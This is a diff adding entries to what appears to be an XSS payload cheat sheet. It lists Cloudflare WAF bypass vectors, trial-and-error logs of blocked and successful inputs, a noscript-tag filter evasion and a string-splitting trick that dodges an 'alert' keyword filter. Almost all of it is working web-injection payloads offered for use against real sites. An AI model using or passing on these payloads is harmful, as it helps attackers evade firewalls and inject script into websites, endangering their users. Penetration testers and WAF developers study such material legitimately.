@@ -29,3 +29,106 @@ site.com/%25%37%32andomsearch/?input=test" 403
 site.com/%25%37%32andomsearch/?
 via #post_data 
 ?input=test<svg/onload=confirm(1)> ( popup )
+
+* KNOXSS XSS Vectors Series *
+
+#XSS Vector #2
+
+1"<!--><Html%2FOnPointerEnter=%26%2397%26%23108%26%23101%26%23114%26%23116%26%2396K%26%2396<!--
+
+A non-closed vector (<!--), case-agnostic payload with URL encoded HTML entities. It relies in mouse movement but with HTML tag whole document screen is available.
+
+XSS BYPASS HARD CLOUDFLARE WAF SOLUTION
+{` <body \< onscroll =1(=prompt,(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))> ´}
+Input : "/**/ONX=""/**/ONFOCUS=prompt()>
+Respond : Blocked 🙁
+Input : "%01onfocus=test>
+Respond : blocked 🙁
+Input : "%2501onfocus=>
+Respond : blocked 🙁
+Input : "test=[1].map(confirm)>
+Respond : blocked 🙁
+Input : "test=[1].map%26%2300000000000040;1)>
+Respond : Blocked 🙁
+Solutions :
+Input : "onx=() onmouseover=prompt(1)>
+Respond : pop up appears 😃
+Input : " onxXxxXXxXXXxx=() autofocus onmouseover=prompt(1)>
+Respond : pop up appears 😃
+Input : "onx={} onmouseover=prompt(1)>
+Respons : pop up appears 😃
+Input : "onx=[] onmouseover=prompt(1)>
+Respond : pop up appears 😃
+
+Dom XSS bypass WAF Cloudflare
+" onfocus=0;[1].some(confirm) haha="
+
+Simple technique XSS REFLECTED Bypass Waf ACCES DENIED & REQUEST REJECTED
+
+Input : "onclick=> 
+Respond : blocked waf :(
+
+Input : "><details ontoggle=>
+Respond : blocked waf :(
+
+Input = "autofocus /*/onXXXXX=""/*/ONFOCUS=
+Respond : blocked waf :(
+
+Input : prompt()
+Respond : blocked waf :(
+
+Input : [1].find(alert)
+Respond : blocked waf :(
+
+Input : constructor.constructor('alert()')() 
+Respond : blocked waf :(
+
+Solutions :
+
+Input : "autofocus %2501onfocus=>
+Respond : not blocked waf :D
+
+Input : <details/autofocus/OnToGGle=>
+Respond : not blocked waf :D
+
+Input : [1].map(alert)
+Respond : not blocked waf :D
+
+Final :
+Input : <details/OPEN/autofocus/OnToGGle=[1].map(confirm)>
+Respond : Pop Up appears :D
+
+Input : "autofocus %2501onfocus=[1].map(confirm)>
+Respond : Pop Up appears :D
+
+Solution XSS BYPASS REMOVED TAG & FILTER TAG HTML ENTITIES WITH NOSCRIPT TAG
+
+Input : <img src=x onerror=prompt(1)>
+Respond : <img>
+
+Input : <svg onload=prompt(1)>
+Respond : &lt;svg onload=prompt&#40;&#41;&gt;
+
+Input : <details ontoggle=prompt(1)>
+Respond : <details xss=removed>
+
+No pop up appears :(
+
+Solution :
+
+Input : <noscript><p title='</noscript><svg onload=prompt(1)>'>
+Respond : <noscript><p title='</noscript><svg onload=prompt&#40;1&#41;>'>
+
+Pop up appears :D
+
+Our 1st-choice #XSS vector reflects:
+
+<Svg/Onload=1
+
+We try to add code but "alert" string gets caught (403) so we split it:
+
+top["al"+"ert"]
+
+No 403 but 400 status code this time so we encode brackets:
+
+<Svg/Onload=top%5B"al"%2B"ert%5D(1)//
